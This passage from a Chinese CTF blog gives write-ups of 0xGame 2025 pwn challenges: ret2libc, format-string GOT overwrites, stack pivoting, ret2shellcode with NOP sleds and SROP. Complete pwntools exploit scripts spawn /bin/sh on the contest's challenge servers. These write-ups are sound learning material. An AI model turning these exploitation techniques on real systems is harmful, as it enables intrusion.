class="string">b&#x27;a&#x27;</span>*<span class="number">15</span></span><br><span class="line">pl1 = pl1.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(s1)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;Hello&gt; &#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">sleep(<span class="number">1</span>)</span><br><span class="line">io.send(p64(<span class="number">0x401021</span>))</span><br><span class="line"></span><br><span class="line">s2 = SigreturnFrame()</span><br><span class="line">s2.rax = <span class="number">59</span></span><br><span class="line">s2.rdi = <span class="number">0x4027c8</span> <span class="comment">#gdb</span></span><br><span class="line">s2.rsi = <span class="number">0</span></span><br><span class="line">s2.rdx = <span class="number">0</span></span><br><span class="line">s2.rsp = <span class="number">0x402800</span></span><br><span class="line">s2.rip = syscall_ret</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;&gt; &#x27;</span>)</span><br><span class="line">pl2 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">15</span> + <span class="string">b&#x27;\x00&#x27;</span> + <span class="string">b&#x27;/bin/sh\x00&#x27;</span></span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x50</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(syscall_ret) + <span class="built_in">bytes</span>(s2) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>解释一下exp。这里的s1是去构造了read函数，将我们后面发送的0x401021入读到0x402800的位置，然后rip处设置的是syscall_ret指令，ret就会把栈顶的值pop给rip，所以就会返回sub_401021函数了，继续执行下面的程序。pl1先填入a*15，是通过write函数中有类似strlen的功能，可以控制字符串长度，从而将rax的值设置为0xf来调用sigreturn。后面就会执行我们构造的read函数。</p>
<p>s2是去构造了execve函数，这里的rdi设置的是存放着&#x2F;bin&#x2F;sh的地址，可以通过gdb动调出来。</p>
<p><img src="/images/24week2.8-2.png" alt="gdb"></p>
<p>这里可以看出我们写入的&#x2F;bin&#x2F;sh的地址，然后将rdi的值控制为binsh的地址就可以了。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 0xGame Week2 Pwn</title>
    <url>/2025/11/12/2025-0xGame-Week2-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week2-Pwn"><a href="#0xGame-Week2-Pwn" class="headerlink" title="0xGame Week2 Pwn"></a>0xGame Week2 Pwn</h1><h2 id="1-Ret2libc"><a href="#1-Ret2libc" class="headerlink" title="1.Ret2libc"></a>1.Ret2libc</h2><p>像这样类似的题，关键是确定libc.so.6的版本，然后泄露出libc_base的地址。因为这样可以确定system的地址和&#x2F;bin&#x2F;sh的地址，从而实现getshell。</p>
<p><img src="/images/week2-1(1).png" alt="ida"></p>
<p>由vuln可以看出read存在溢出点。</p>
<p><img src="/images/week2-1(2).png" alt="exp"></p>
<p>解读一下exp，这边pl1通过栈溢出，覆盖至ret，因为ret指令实际上相当于pop rip，即将rsp处的值弹给rip去执行。所以这里将ret地址返回为puts_plt，也就是会执行一个puts函数，同时rdi中存储着puts的真实地址，由puts_got表跳转得到。再减去由libc.so.6版本控制的offset，就可以获得libc_base的地址。然后就是正常的rop链攻击。</p>
<h2 id="2-格式化字符串"><a href="#2-格式化字符串" class="headerlink" title="2.格式化字符串"></a>2.格式化字符串</h2><p>将附件丢进ida静态分析</p>
<p><img src="/images/week2-2(1).png" alt="ida"></p>
<p>可以看出这里有两次read和printf函数，并且每次都会将我们输入的数据输出。由于第一个read函数规定读取数据大小只有0x60，所以这里不存在溢出点。但是可以通过第一个read来泄露一些我们需要的数据，如canary和libc_base的地址。·第二个read存在栈溢出，是我们构造payload的重点。</p>
<p><img src="/images/week2-2(2).png" alt="exp"></p>
<p>这里来解释一下exp，通过数据测试，可以得到我们填入的数据应该在栈上第六个位置。从上往下找，看到末尾字节为00的就是canary的地址。（特性）</p>
<p><img src="/images/week2-2(3).png" alt="gdb"></p>
<p><img src="/images/week2-2(4).png" alt="gdb"></p>
<p>在栈上距离我们输入的aaaa（测试数据）为0x0d-0x00+6(寄存器)&#x3D;19，同时此时rcx处放的是read+18的地址。所以libc_base &#x3D; rcx内存的地址 - libc.symbols[‘read’] - 18。可以检验libc_base的末三位是否为000。如果是的，那么恭喜得到了正确的libc_base。然后就是进行对printf_got的改写，改写为system_addr。</p>
<p>板子为：fmtstr_payload(6,{printf_got:system_addr})。一定要context.arch&#x3D;”amd64&#x2F;i386”。不过本题似乎仅仅使用板子不行。因为此处板子长度为0x78，会将canary的地址覆盖，导致段错误。（刻意去用板子其实也可以成功，但还是推荐手写）</p>
<p>那怎么改写呢？由于libc_base+sysmbols[‘ ‘]，所以导致了system与printf其实仅仅有后三位字节不同也就是说只要改写后三位字节即可。</p>
<p><img src="/images/week2-2(5).png"></p>
<p>由于单次写入长度过大，可能导致不稳定，所以选择单字节或双字节写入。之后的就可以看exp。</p>
<p>最后pl2为什么要填充到0x30呢？因为我改写的地址是12，13，对应栈上的位置应该是06，07，而此时距离rsp的距离就是0x30（不断向栈上填入数据，会将rsp”抬高”）。</p>
<p><img src="/images/week2-2(6).png" alt="gdb"></p>
<h2 id="3-植物大战僵尸"><a href="#3-植物大战僵尸" class="headerlink" title="3.植物大战僵尸"></a>3.植物大战僵尸</h2><p>进ida分析，可以看出是多线程问题，而且未上锁，且存在1s的延迟。</p>
<p><img src="/images/week2-3(1).png" alt="ida"></p>
<p><img src="/images/week2-3(2).png" alt="ida"></p>
<p><img src="/images/week2-3(3).png" alt="ida"></p>
<p>可以看出，这里的root函数存在后门。来一下实现条件，是trophy!&#x3D;0就可以了。所以可以通过在短时间内大量创建用户，将数组填满，就可以改变trophy的值为非0。下面是exp。</p>
<p><img src="/images/week2-3(4).png" alt="exp"></p>
<h2 id="4-任意代码执行"><a href="#4-任意代码执行" class="headerlink" title="4.任意代码执行"></a>4.任意代码执行</h2><p><img src="/images/week2-4(1).png" alt="ida"></p>
<p>这里是通过构造shellcode读取到bss段进行恶意代码执行。可以看出这里如果我们输入的字节数大于3就会直接退出程序。所以我们需要绕过strlen检测。那么strlen是如何截断的呢？是通过读取’\x00’的前的字节数来返回字节数值。于是我们可以通过构造’\x00’+shellcode来绕过。这道题还有个小坑。如果用板子asm(shellcraft.sh())去进行shellcode构造的话，这道题是做不出来的。因为这里的read读取长度限制为0xa，也就是只有10个字节，是远远小于我们用板子直接构造出来的shellcode的。所以我们需要先构造一个可以读取足够长度的read函数，再来调用，从而读入我们需要的shellcode。</p>
<p><img src="/images/week2-4(2).png" alt="exp"></p>
<p>这边来说一下手动构造。</p>
<p><img src="/images/week2-4(3).png" alt="gdb"></p>
<p>想要构造read函数，就要先控制read传参的寄存器。即rdi–fd，rsi–buf，rdx–len。在gdb调试中，可以看出，rdi&#x3D;0，而我们仍然进行了xor rdi,rdi（保险起见），就是为了让rdi&#x3D;0。rsi此时指向的地址就是bss段，所以不需要进行修改。而我们需要一个较长的读取长度。可以看到这里的r11存放着0x246就已经够了，所以用mov rdx,r11就可以将把r11中的值给rdx，至此一个读取较长长度的read函数就构造好了。最后又用到了一个nop sled的技巧，通过填充大量的nop来使执行自己的恶意代码的概率提高。</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025 0xGame Week1 Pwn</title>
    <url>/2025/11/11/2025-0xGame-Week1-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week1-Pwn"><a href="#0xGame-Week1-Pwn" class="headerlink" title="0xGame Week1 Pwn"></a>0xGame Week1 Pwn</h1><h2 id="1-Test-your-nc"><a href="#1-Test-your-nc" class="headerlink" title="1.Test your nc"></a>1.Test your nc</h2><p>简单的签到题，熟知nc的用法即可。</p>
<p><img src="/images/week1-1(1).png" alt="图解"></p>
<h2 id="2-命令执行"><a href="#2-命令执行" class="headerlink" title="2.命令执行"></a>2.命令执行</h2><p>同样远端连接后，可以直接获取shell，不过过滤了cat和sh指令。通过拼接就可以成功获得flag。</p>
<p><img src="/images/week1-2(1).png" alt="图解"></p>
<h2 id="3-Stack-overflow"><a href="#3-Stack-overflow" class="headerlink" title="3.Stack overflow"></a>3.Stack overflow</h2><p>栈溢出。先丢进ida查看，发现backdoor，却是假的，但是whhhat给出了shell。再看main函数，看到了read危险函数，并且存在溢出的机会。</p>
<p><img src="/images/week1-3(1).png" alt="ida"></p>
<p><img src="/images/week1-3(2).png" alt="exp"></p>
<p>简单说一下exp，首先是对pwn工具库的一个调用，之后是对远端的连接，如果是在虚拟机上连接远端环境用remote，如果在物理机上则用connect，调试也可以用process指令。观察ida可以看出距离rbp为0x30又有0x8（64位下）的大小存放rbp，所以距离ret_addr实际上是0x38的大小，所以填充0x38的padding来使函数返回至后门函数，也就是shell的地址（在ida中找出，这里不做演示）。最后getshell。</p>
<p><img src="/images/week1-3(3).png" alt="图解"></p>
<h2 id="4-ROP1"><a href="#4-ROP1" class="headerlink" title="4.ROP1"></a>4.ROP1</h2><p>rop链是pwn的一种常见攻击手段，可以上网看看原理。把附件丢进ida中</p>
<p><img src="/images/week1-4(1).png" alt="ida"></p>
<p>可以看到有gadget函数，可以在ida中查看gadget的地址为0x40117E，也可以在bash中用指令（ROPgadget –binary “文件名” –only “pop|ret” | grep “rdi”）获得地址。</p>
<p><img src="/images/week1-4(4).png" alt="rdi"></p>
<p>由于在ida中找不到sh相关的字符串，于是可以从gdb中获取（当然选择在help中用偏移也是可以打通的）</p>
<p><img src="/images/week1-4(2).png" alt="sh"></p>
<p>从而可以构造exp</p>
<p><img src="/images/week1-4(3).png" alt="exp"></p>
<h5 id="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。"><a href="#由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64-ret-的由来。" class="headerlink" title="由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。"></a>由于ubuntu的版本，所以这里需要进行栈对齐，也就是payload中p64(ret)的由来。</h5><p>这里的ret是任意的一个ret_addr，因为其大小为1，所以可以起到一个对齐的作用。（因为我也不完全清楚其背后的原理QAQ）</p>
<h2 id="5-ROP2"><a href="#5-ROP2" class="headerlink" title="5.ROP2"></a>5.ROP2</h2><p>这道题的解法其实和上一道rop1类似，不过由于过滤掉了sh，bash等sh类指令，所以这边可以联想到$0这个神奇的参数也可以起到一个shell的作用。</p>
<p><img src="/images/week1-5(1).png" alt="$0"></p>
<p>exp如下图</p>
<p><img src="/images/week1-5(2).png" alt="exp"></p>
<p>week1至此结束，至于还有一道简单数学题，对python语法要求较高，我就不在此叙述。（绝对不是我菜QWQ）</p>
]]></content>
      <categories>
        <category>stack</category>
      </categories>
      <tags>
        <tag>pwn入门</tag>
      </tags>
  </entry>
  <entry>
    <title>2025-0xGame-Week3-Pwn</title>
    <url>/2026/01/05/2025-0xGame-Week3-Pwn/</url>
    <content><![CDATA[<h1 id="0xGame-Week3-Pwn"><a href="#0xGame-Week3-Pwn" class="headerlink" title="0xGame-Week3-Pwn"></a>0xGame-Week3-Pwn</h1><h2 id="1-Ret2shellcode"><a href="#1-Ret2shellcode" class="headerlink" title="1.Ret2shellcode"></a>1.Ret2shellcode</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> random_number; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;have a good time&quot;</span>);</span><br><span class="line">  mprotect((<span class="type">void</span> *)((<span class="type">unsigned</span> __int64)&amp;buf &amp; <span class="number">0xFFFFFFFFFFFFF000L</span>L), <span class="number">0x1000u</span>LL, <span class="number">7</span>);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0x100u</span>LL);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">256</span>; ++i )</span><br><span class="line">    ;</span><br><span class="line">  random_number = get_random_number();</span><br><span class="line">  ((<span class="type">void</span> (*)(<span class="type">void</span>))((<span class="type">char</span> *)&amp;buf + random_number % <span class="number">80</span> + <span class="number">80</span>))();</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>在Linux系统中，<code>mprotect</code>函数用于修改指定内存区域的保护属性。</p>
<p>所以这里我们可以看出，给 buf区，0x1000长度，7的权限，也就是rwx权限。所以我们这里可以往buf里读入shellcode从而getshell。不过这里由于最后调用函数的位置是buf+random_number%80+80，所以offset在80-159。由于我们可以读入0x100的数据，所以不管具体在哪里执行，我们都可以填入大量的nop，来使击中我们shellcode的概率大大增加。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">42606</span>)</span><br><span class="line"></span><br><span class="line">pl = asm(shellcraft.sh()).rjust(<span class="number">0x100</span>,<span class="string">b&#x27;\x90&#x27;</span>) <span class="comment">#nop</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;have a good time&#x27;</span>)</span><br><span class="line">io.send(pl)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="2-栈迁移"><a href="#2-栈迁移" class="headerlink" title="2.栈迁移"></a>2.栈迁移</h2><p>丢进ida发现就只有一个vuln函数里给了read函数的栈溢出。而且溢出大小只有0x10。所以我们需要通过栈迁移来获取较大的空间，来构造我们的rop。</p>
<p>下面先给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">38325</span>)</span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">puts_got = elf.got[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">puts_plt = elf.plt[<span class="string">&#x27;puts&#x27;</span>]</span><br><span class="line">vuln = elf.symbols[<span class="string">&#x27;vuln&#x27;</span>]</span><br><span class="line">rdi = <span class="number">0x4011c5</span></span><br><span class="line">ret = <span class="number">0x4011f4</span></span><br><span class="line">bss = <span class="number">0x404070</span> + <span class="number">0x500</span> <span class="comment">#rsp</span></span><br><span class="line">pop_rbp = <span class="number">0x40115d</span></span><br><span class="line">offset = <span class="number">0x100</span></span><br><span class="line">read = elf.plt[<span class="string">&#x27;read&#x27;</span>]</span><br><span class="line">leave = <span class="number">0x4011f3</span></span><br><span class="line"><span class="comment">#---&gt; bss</span></span><br><span class="line">pl1 = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(bss+offset) + p64(<span class="number">0x4011d9</span>) <span class="comment">#lea</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27; :)&#x27;</span>)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl1)</span><br><span class="line">pl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+<span class="number">0x300</span>+offset) + p64(<span class="number">0x4011d9</span>)</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">8</span>) + p64(leave) </span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl2)</span><br><span class="line">base = u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:]+<span class="string">b&#x27;\x00\x00&#x27;</span>) - libc.sym.puts</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">pl3 = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(rdi) + p64(binsh) + p64(ret) + p64(sys)</span><br><span class="line">pl3 = pl3.ljust(offset,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss+<span class="number">0x300</span>) + p64(leave)</span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">io.send(pl3)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>这里bss加上0x500是为了放置写入的数据破坏了bss段本身就有的数据，导致程序报错。</p>
<p>想要了解栈迁移前，我们需要了解leave和ret。</p>
<p>leave其实可以理解为<code>mov rsp,rbp;pop rbp</code>，而ret可以理解为<code>pop rip</code>。所以bss+offset会被弹为新的rbp地址，然后返回0x4011d9处去执行。</p>
<p>看到pl1这里是bss+0x100，为什么呢？因为这里bss+0x100实际上是先去定下了rbp的地址，后面再次调用read的时候，去开辟空间是根据rbp来寻址，也就是说会减掉0x100的字节大小。所以最后我们的bss就定下了rsp的地址。后面的0x4011d9我们来看一下这里具体干了什么。</p>
<p><img src="/images/week3-2(1).png" alt="ida"></p>
<p>可以看出来，这里就是我们说的根据rbp来开辟read的读入空间。也就是说，此时我们将rbp的地址改为bss段上某一处的地址，然后读入的缓冲区也跟着到了bss段了。</p>
<p>接着就是新的一轮read，我们来看看我们往bss段上写入了什么。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">pl2 = p64(rdi) + p64(puts_got) + p64(puts_plt) + p64(pop_rbp) + p64(bss+<span class="number">0x300</span>+offset) + p64(<span class="number">0x4011d9</span>)</span><br><span class="line">pl2 = pl2.ljust(<span class="number">0x100</span>,<span class="string">b&#x27;\x00&#x27;</span>) + p64(bss-<span class="number">8</span>) + p64(leave) </span><br></pre></td></tr></table></figure>

<p>可以看出，我们是想要泄露libc_base的地址。然后我们在bss段上构造了一个假的leak后面的pop_rbp相当于leave;ret指令，是为了二次读入shellcode，同时再将rbp的地址迁移到更高的位置。后面又读入一次，就是和ret2libc类似的打法。关键这里需要看懂各个栈的位置。由于rsp会在进程中自增8，可以通过gdb看出，所以后面我们leave处写入的地址是bss-8，然后rsp处又会弹到bss段，正好布置到我们pop_rdi的地方，然后泄露libc_base。</p>
<p>pl3处写一个b’a’*8是因为我们最后有一个leave。所以会pop rip也就是将栈顶的内容弹出。那么如果是不填充padding的话，就会导致我们的pop_rdi的指令被pop 到rip里，此时我们构造的rop就被破坏了。所以需要给rbp一个值。需要配合gdb逐步调试。</p>
<h2 id="3-FMT？"><a href="#3-FMT？" class="headerlink" title="3.FMT？"></a>3.FMT？</h2><p>这次我们输入的内容不在栈上了，我们又该怎么利用任意地址读和写呢？</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I know you can rce from fmt&quot;</span>);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;But without stack,how can you change val?&quot;</span>);</span><br><span class="line">    read(<span class="number">0</span>, bss, <span class="number">0x200u</span>LL);</span><br><span class="line">    <span class="built_in">printf</span>(bss);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>可以看到我们读入的地址都在bss段。我们进gdb调试可以看到</p>
<p><img src="/images/week3-3(1).png" alt="gdb"></p>
<p>可以看出来这有多级指针可以指向main的地址，那么我们又知道printf_got表的地址和main函数相差不是很大，所以可以通过改写main为printf_got的地址，再将printf的真实地址改写为system的地址，就可以在我们读入shell时成功getsehll了。</p>
<p>下面给出exp。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level =  &#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">io = process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#io = remote(&#x27;nc1.ctfplus.cn&#x27;,45337)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">sd</span>(<span class="params">payload</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;val?&#x27;</span>)</span><br><span class="line">    io.send(payload)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;val?&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;aa%7$pbb%11$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;aa&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">success(<span class="string">f&#x27;base---&gt;&#x27;</span>+<span class="built_in">hex</span>(base))</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;bb&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">14</span>),<span class="number">16</span>)</span><br><span class="line">success(<span class="string">f&#x27;stack---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">success(<span class="built_in">hex</span>(sys))</span><br><span class="line">stack1 = stack - <span class="number">0x100</span></span><br><span class="line">stack2 = stack - <span class="number">0xd0</span></span><br><span class="line">success(<span class="string">f&#x27;stack1---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack1))  <span class="comment">#de88</span></span><br><span class="line">success(<span class="string">f&#x27;stack2---&gt;&#x27;</span>+<span class="built_in">hex</span>(stack2))  <span class="comment">#deb8</span></span><br><span class="line">pl1 = <span class="string">f&#x27;%<span class="subst">&#123;stack1&amp;<span class="number">0xffff</span>&#125;</span>c%11$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl1)</span><br><span class="line">got = <span class="number">0x4028</span></span><br><span class="line">pl2 = <span class="string">f&#x27;%<span class="subst">&#123;got&#125;</span>c%41$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl2)</span><br><span class="line">high = (sys&gt;&gt;<span class="number">16</span>)&amp;<span class="number">0xff</span></span><br><span class="line">low = sys&amp;<span class="number">0xffff</span></span><br><span class="line">success(<span class="string">f&#x27;high---&gt;&#x27;</span>+<span class="built_in">hex</span>(high))</span><br><span class="line">success(<span class="string">f&#x27;low---&gt;&#x27;</span>+<span class="built_in">hex</span>(low))</span><br><span class="line"></span><br><span class="line">pl3 = <span class="string">f&#x27;%<span class="subst">&#123;stack2&amp;<span class="number">0xffff</span>&#125;</span>c%11$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl3)</span><br><span class="line">pl4 = <span class="string">f&#x27;%<span class="subst">&#123;got+<span class="number">2</span>&#125;</span>c%41$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl4)</span><br><span class="line">pl5 = <span class="string">f&#x27;%<span class="subst">&#123;high&#125;</span>c%15$hhn&#x27;</span></span><br><span class="line">pl5 += <span class="string">f&#x27;%<span class="subst">&#123;low-high&#125;</span>c%9$hn&#x27;</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line">sd(pl5)</span><br><span class="line">sd(<span class="string">b&#x27;/bin/sh&#x27;</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>

<p>pl1的作用是将偏移为11处的地址指向main，然后pl2是改为printf_got表地址。看看效果</p>
<p><img src="/images/week3-3(2).png" alt="gdb"></p>
<p>可以看到后面直接给出了printf的真实地址。由于单次改写字节不能太大，一般建议1-2字节改入，而比较可以system和printf的真实地址差三字节。所以我们要通过两次改写，也就是pl5的作用。由于同一处地址不能进行两处改写，所以我们这里又去找了另一个指向main的地址，重新经行上面的工作。不过由于我们第一次是改写的末二位字节，所以将got的地址+2就可以改写第末三字节。</p>
<p>由于末二位字节写入的长度大于第末三位。所以我们这里采用先写入第末三位字节，再写入末二位字节。</p>
<p>有一天晚上突发奇想，翻自己博客看到这题。又敏感的注意到溢出长度只有0x10。于是考虑栈迁移能不能做。发现我只会做迁移到栈上的，迁移到bss段则是始终不行，下面先给出exp。也不过多赘述了。</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io = process(&#x27;./pwn&#x27;)</span></span><br><span class="line">io = remote(<span class="string">&#x27;nc1.ctfplus.cn&#x27;</span>,<span class="number">37271</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;language&#x27;</span>)</span><br><span class="line">io.send(<span class="string">b&#x27;%19$p%21$p%25$p&#x27;</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">canary = <span class="built_in">int</span>(io.recv(<span class="number">16</span>),<span class="number">16</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">base = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>) - <span class="number">0x29d90</span></span><br><span class="line">io.recvuntil(<span class="string">b&#x27;0x&#x27;</span>)</span><br><span class="line">stack = <span class="built_in">int</span>(io.recv(<span class="number">12</span>),<span class="number">16</span>)</span><br><span class="line">rsp = stack - <span class="number">0x188</span></span><br><span class="line">success(<span class="built_in">hex</span>(canary))</span><br><span class="line">success(<span class="built_in">hex</span>(base))</span><br><span class="line">success(<span class="built_in">hex</span>(stack))</span><br><span class="line">leave = <span class="number">0x401275</span></span><br><span class="line">rdi = base + <span class="number">0x2a3e5</span></span><br><span class="line">binsh = base + <span class="built_in">next</span>(libc.search(<span class="string">&#x27;/bin/sh\x00&#x27;</span>))</span><br><span class="line">sys = base + libc.sym.system</span><br><span class="line">pl = <span class="string">b&#x27;a&#x27;</span>*<span class="number">8</span> + p64(rdi) + p64(binsh) + p64(<span class="number">0x401276</span>) + p64(sys)</span><br><span class="line">pl = pl.ljust(<span class="number">0x68</span>,<span class="string">b&#x27;a&#x27;</span>) + p64(canary) + p64(rsp) + p64(leave)</span><br><span class="line">io.send(pl)</span><br><span class="line"><span class="comment">#bss = 0x404500</span></span><br><span class="line"><span class="comment">#pl1 = b&#x27;a&#x27;*0x68 + p64(canary) + p64(bss+0x70) + p64(0x401235)</span></span><br><span class="line"><span class="comment">#io.send(pl1)</span></span><br><span class="line"><span class="comment">#pl2 = b&#x27;a&#x27;*8 + p64(rdi) + p64(binsh) + p64(0x401276) + p64(sys)</span></span><br><span class="line"><span class="comment">#pl2 = pl2.ljust(0x68,b&#x27;a&#x27;) + p64(canary) + p64(bss) + p64(leave)</span></span><br><span class="line"><span class="comment">#gdb.attach(io)</span></span><br><span class="line"><span class="comment">#io.send(pl2)</span></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="4-SROP"><a href="#4-SROP" class="headerlink" title="4.SROP"></a>4.SROP</h2><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">start</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">signed</span> __int64 v0; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  vuln();</span><br><span class="line">  v0 = sys_exit(<span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> vuln();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">signed</span> __int64 <span class="title function_">vuln</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> buf[<span class="number">256</span>]; <span class="comment">// [rsp+0h] [rbp-100h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> sys_write(<span class="number">1u</span>, buf, sys_read(<span class="number">0</span>, buf, <span class="number">0x300u</span>LL));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>程序很简单，就给了write和exit的系统调用，再结合题干所述，可以知道这里要用srop的技巧。</p>
<p>下面给出exp。</p>
